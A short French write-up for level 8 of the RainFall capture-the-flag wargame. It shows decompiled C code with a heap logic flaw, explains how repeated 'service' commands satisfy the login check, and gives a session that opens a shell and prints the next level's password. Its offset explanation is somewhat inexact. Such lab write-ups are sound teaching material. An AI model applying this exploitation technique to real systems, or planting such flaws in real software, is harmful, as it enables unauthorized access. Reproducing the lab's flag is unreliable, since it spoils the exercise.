# Level8

Voici le code de l'executable decompile avec Hex-Rays
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[5]; // [esp+20h] [ebp-88h] BYREF
  char v5[2]; // [esp+25h] [ebp-83h] BYREF
  char v6[129]; // [esp+27h] [ebp-81h] BYREF

  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
  return 0;
}
```
On constate que le programme est une boucle qui change de comportement en fonction des entrees clavier.
Le programme verifie que "auth " est entre pour initialise "*(_DWORD *)auth = 0;"

Quand nous entrons service une premiere fois nous ecrivons une adresse sur le tas a auth+4.
Il suffit d'entrer une nouvelle fois service pour entrer une adresse a auth+8.

En entrans login nous passons donc dans la condition pour ouvrir lancer un bash.

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```